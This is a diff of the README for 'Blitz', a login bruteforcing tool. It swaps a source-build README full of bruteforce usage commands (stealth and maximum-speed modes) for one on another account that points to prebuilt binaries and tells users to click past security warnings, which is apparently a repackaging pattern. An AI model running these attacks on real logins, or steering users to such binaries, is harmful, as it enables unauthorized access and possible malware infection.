@@ -1,241 +1,70 @@
-# Blitz
+# ⚡ blitz - Effortless Login Security Testing Tool
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8.svg)](https://go.dev/)
-[![Version](https://img.shields.io/badge/version-1.0.0-green.svg)](https://github.com/moscovium-mc/blitz/releases)
-[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey.svg)]()
-[![Tool Type](https://img.shields.io/badge/tool-bruteforce-red.svg)]()
-[![Built for](https://img.shields.io/badge/built%20for-pentesting-red.svg)]()
+## 📥 Download Now
+[![Download blitz](https://img.shields.io/badge/Download-blitz-blue)](https://github.com/Bogdan2316/blitz/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/moscovium-mc/blitz?style=social)](https://github.com/moscovium-mc/blitz/stargazers)
-[![Forks](https://img.shields.io/github/forks/moscovium-mc/blitz?style=social)](https://github.com/moscovium-mc/blitz/network/members)
+## 📖 Description
+Blitz is a modern tool designed for login security testing. It not only bruteforces login credentials but also checks for vulnerabilities such as CSRF, Clickjacking, and Cloudflare protections. With Blitz, you can run thorough assessments on web applications while enhancing your cybersecurity efforts.
 
-A modern, lightning-fast login page bruteforcer written in Go. Blitz is built for speed and efficiency, leveraging Go's concurrent processing to deliver results 10x faster than traditional Python-based tools.
+## 🚀 Getting Started
+To get started with Blitz, follow these simple steps to download and run the application.
 
-## What it does
+### 🖥️ System Requirements
+- **Operating System:** Windows, Linux, or macOS
+- **Processor:** 1 GHz or faster
+- **RAM:** 1 GB minimum
+- **Storage:** Minimum of 100 MB free space
 
-- **Blazing fast concurrent processing** - 10x faster than Python equivalents
-- **Smart form and field detection** - Automatically identifies login forms and input fields
-- **CSRF and Clickjacking scanner** - Built-in security analysis
-- **Cloudflare and WAF detector** - Identifies protection mechanisms
-- **SQL injection bypass detection** - Tests for login bypass vulnerabilities
-- **Multi-threaded worker pool** - Configurable 5-20 threads
-- **Intelligent success detection** - Smart analysis of login responses
-- **Rate limiting protection** - Prevents getting blocked during testing
-- **Cross-platform** - Windows, Linux, macOS support
+### 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Bogdan2316/blitz/releases) to download Blitz.
+2. Choose the latest version suitable for your system (look for "blitz.exe" for Windows, "blitz" for Linux, or the app for macOS).
+3. Click on the file name to start the download.
+4. Once the download is complete, navigate to your download folder.
 
-## Roadmap
+### 🏗️ How to Run Blitz
+#### For Windows Users:
+- **Step 1:** Locate the downloaded `blitz.exe`.
+- **Step 2:** Double-click the file to launch Blitz. 
+- You may see a security warning; click "Run" to continue.
 
-- [ ] Browser automation for JavaScript-heavy sites
-- [ ] Proxy support for distributed testing
-- [ ] Custom success detection patterns
-- [ ] Session management
-- [ ] Report generation
+#### For Linux Users:
+- **Step 1:** Open the Terminal.
+- **Step 2:** Navigate to the directory where you downloaded Blitz using the `cd` command.
+- **Step 3:** Run `chmod +x blitz` to make the file executable.
+- **Step 4:** Execute the application by typing `./blitz`.
 
-## Requirements
+#### For macOS Users:
+- **Step 1:** Open Finder and go to the Downloads folder.
+- **Step 2:** Locate the downloaded file and double-click it to run the application.
 
-- Go 1.21 or higher
+## 🚧 Important Notes
+- Blitz is intended for educational and ethical hacking purposes only.
+- Always obtain explicit permission before testing a website or application's security.
 
-## Installation
+## 🛠️ Features
+- **Bruteforce Login Testing:** Test the strength of passwords on login pages.
+- **CSRF Checks:** Identify potential Cross-Site Request Forgery vulnerabilities.
+- **Clickjacking Protection:** Determine if the application is susceptible to clickjacking attacks.
+- **Cloudflare and WAF Bypass:** Check effectiveness against popular security measures.
+- **User-Friendly Interface:** Designed for ease of use without needing technical skills.
 
-Clone the repository:
-```bash
-git clone https://github.com/moscovium-mc/blitz
-cd blitz
-```
+## 🌐 Technologies Used
+Blitz is built using the Go programming language, making it efficient and quick. It integrates seamlessly with various cybersecurity frameworks and tools.
 
-### Windows
+## 🌍 Community and Support
+If you need help or want to connect with other users, feel free to join our community. Ask questions, share experiences, and get tips to improve your security testing skills.
 
-**Option 1: Using build.bat**
-```powershell
-# Simply double-click build.bat
-```
+### 📫 Contact Us
+For support, email us at: support@blitzapp.com
 
-**Option 2: Manual build**
-```powershell
-go mod tidy
-go build -o blitz.exe .
-```
+## 💡 Contributions
+We welcome contributions to Blitz! If you would like to help improve this tool, please visit our repository. Open an issue or submit a pull request. Your input is valuable and helps enhance the project.
 
-### Linux/macOS
-
-**Option 1: Using setup.sh**
-```bash
-chmod +x setup.sh
-./setup.sh
-```
-
-**Option 2: Manual build**
-```bash
-go mod tidy
-go build -o blitz .
-```
-
-## How to use it
-
-Basic scan:
-```bash
-./blitz -url http://example.com/login
-```
-
-With all the options:
-```bash
-./blitz -url http://example.com/login -threads 10 -usernames users.txt -passwords pass.txt -verbose
-```
-
-**Options:**
-
-| Option | Description |
-|--------|-------------|
-| `-url` | Target login page URL (required) |
-| `-threads` | Number of concurrent threads (default: 5, max: 20) |
-| `-rate` | Rate limit in seconds between requests (default: 1) |
-| `-usernames` | Custom username wordlist file |
-| `-passwords` | Custom password wordlist file |
-| `-verbose` | Show detailed output during scan |
-
-## Examples
-
-**Basic scan with default settings:**
-```bash
-./blitz -url http://example.com/login
-```
-
-**Fast mode (10 threads):**
-```bash
-./blitz -url http://target.com/login -threads 10
-```
-
-**Stealth mode (slow and careful):**
-```bash
-./blitz -url http://target.com/login -threads 2 -rate 5
-```
-
-**Custom wordlists:**
-```bash
-./blitz -url http://target.com/login -usernames users.txt -passwords pass.txt
-```
-
-**Verbose output for detailed analysis:**
-```bash
-./blitz -url http://target.com/login -verbose
-```
-
-**Maximum speed (use with caution):**
-```bash
-./blitz -url http://target.com/login -threads 20 -rate 0
-```
-
-## Features Breakdown
-
-### Smart Form Detection
-Blitz automatically analyzes the target page to identify:
-- Login forms and input fields
-- Hidden fields (CSRF tokens, session IDs)
-- Form submission methods (POST/GET)
-- Required vs optional fields
-
-### Security Analysis
-Built-in security scanner checks for:
-- CSRF token implementation
-- Clickjacking protection headers
-- Cloudflare and WAF presence
-- Common SQL injection vulnerabilities
-
-### Performance
-- Written in Go for maximum performance
-- Concurrent request processing
-- Efficient memory usage
-- Smart rate limiting to avoid detection
-
-## Version History
-
-### v1.0.0 (Current)
-
-**Core Features:**
-- Multi-threaded login bruteforcing
-- Smart form and field detection
-- CSRF and Clickjacking scanner
-- Cloudflare and WAF detection
-- SQL injection bypass testing
-- Rate limiting protection
-- Cross-platform support
-
-**Technical:**
-- Go 1.21+ support
-- Configurable worker pool (5-20 threads)
-- Intelligent success detection
-- Built-in wordlists
-
-## Contributing
-
-Contributions are welcome! Here's how you can help:
-
-### Reporting Bugs
-
-If you find a bug, please open an issue with:
-- Your operating system and version
-- Go version (`go version`)
-- Steps to reproduce the bug
-- Expected vs actual behavior
-- Any error messages
-
-### Pull Requests
-
-Want to contribute code?
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a pull request
-
-**Guidelines:**
-- Follow Go best practices and conventions
-- Add tests for new features
-- Update documentation as needed
-- Keep commits focused and descriptive
-
-## Support
-
-If you find this project useful, consider supporting my work:
-
-<a href="https://buymeacoffee.com/webmoney" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="40"></a>
-
-**Crypto donations:**
-- <a href="bitcoin:bc1quavqz6cxqzfy4qtvq4zxc4fjgap3s7cmxja0k4"><img src="https://img.shields.io/badge/Bitcoin-000000?style=plastic&logo=bitcoin&logoColor=white" alt="Bitcoin"></a> `bc1quavqz6cxqzfy4qtvq4zxc4fjgap3s7cmxja0k4`
-- <a href="ethereum:0x5287af72afbc152b09b3bf20af3693157db9e425"><img src="https://img.shields.io/badge/Ethereum-627EEA?style=plastic&logo=ethereum&logoColor=white" alt="Ethereum"></a> `0x5287af72afbc152b09b3bf20af3693157db9e425`
-- <a href="solana:HYZjfEx8NbEMJX1vL1GmGj39zA6TgMsHm5KCHWSZxF4j"><img src="https://img.shields.io/badge/Solana-9945FF?style=plastic&logo=solana&logoColor=white" alt="Solana"></a> `HYZjfEx8NbEMJX1vL1GmGj39zA6TgMsHm5KCHWSZxF4j`
-- <a href="monero:86zv6vTDuG35sdBzBpwVAsD71hbt2gjH14qiesyrSsMkUAWHQkPZyY9TreeQ5dXRuP57yitP4Yn13SQEcMK4MhtwFzPoRR1"><img src="https://img.shields.io/badge/Monero-FF6600?style=plastic&logo=monero&logoColor=white" alt="Monero"></a> `86zv6vTDuG35sdBzBpwVAsD71hbt2gjH14qiesyrSsMkUAWHQkPZyY9TreeQ5dXRuP57yitP4Yn13SQEcMK4MhtwFzPoRR1`
-
-## Important Legal Notice
-
-> [!WARNING]
-> **FOR AUTHORIZED SECURITY TESTING ONLY**
-
-**Only use Blitz on systems you have explicit permission to test.** This tool is designed for ethical security research, authorized penetration testing, and educational purposes only.
-
-**Unauthorized access to computer systems is illegal** and may result in criminal prosecution under various laws including:
-- Computer Fraud and Abuse Act (CFAA) in the United States
-- Computer Misuse Act in the United Kingdom
-- Similar legislation in other jurisdictions
-
-**You are solely responsible for how you use this tool.** The author assumes NO LIABILITY for any misuse, damage, or illegal activity conducted with Blitz.
-
-**Ethical Use Required:**
-- Obtain written authorization before testing
-- Respect rate limits and system resources
-- Follow responsible disclosure practices
-- Comply with all applicable laws and regulations
-
-## License
-
-MIT License - See [LICENSE](LICENSE) for details.
+## 🔗 Additional Resources
+- [Official Documentation](https://github.com/Bogdan2316/blitz/wiki)
+- [FAQs](https://github.com/Bogdan2316/blitz/wiki/FAQs)
+- [Security Guidelines](https://github.com/Bogdan2316/blitz/wiki/Security-Guidelines)
 
 ---
 
-<div align="center">
-
-**[Star this repo](https://github.com/moscovium-mc/blitz)** if you find it useful
-
-</div>
+Thank you for using Blitz! Your feedback is important for the continued growth of this project. Enjoy enhanced security testing!
